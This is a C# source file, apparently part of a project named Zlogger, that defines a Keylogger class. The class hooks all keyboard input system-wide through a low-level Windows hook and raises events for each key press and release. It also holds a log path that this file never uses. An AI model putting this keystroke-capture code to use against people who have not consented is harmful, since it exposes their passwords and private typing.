using Rodjenihm.Zlogger.WinAPI;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Rodjenihm.Zlogger.Core
{
    public class Keylogger : IDisposable
    {
        private readonly LowLevelKeyboardHook hook;
        private readonly HOOKPROC keyboardHookProc = null;
        public string LogPath { get; set; } = string.Empty;


        public Keylogger()
        {
            hook = new LowLevelKeyboardHook();
            keyboardHookProc = (nCode, wParam, lParam) =>
            {
                if (nCode >= 0)
                {
                    var vkCode = Marshal.ReadInt32(lParam);
                    var keyEventArgs = new KeyEventArgs { VkCode = vkCode };

                    if (wParam == (IntPtr)WindowsMessages.WM_KEYDOWN) OnKeyDown(this, keyEventArgs);
                    if (wParam == (IntPtr)WindowsMessages.WM_KEYUP) OnKeyUp(this, keyEventArgs);
                }

                return hook.NextHook(nCode, wParam, lParam);
            };
        }

        public Keylogger(string logPath) : this()
        {
            LogPath = logPath;
        }

        public void Run()
        {
            if (keyboardHookProc != null) hook.SetHook(keyboardHookProc);
            else throw new ArgumentNullException("Keyboard Hook Procedure is null", nameof(keyboardHookProc));
        }

        public void Dispose()
        {
            hook.RemoveHook();
        }

        public event EventHandler<KeyEventArgs> KeyDown;
        public event EventHandler<KeyEventArgs> KeyUp;

        protected virtual void OnKeyDown(object sender, KeyEventArgs e)
        {
            KeyDown?.Invoke(sender, e);
        }

        protected virtual void OnKeyUp(object sender, KeyEventArgs e)
        {
            KeyUp?.Invoke(sender, e);
        }
    }
}
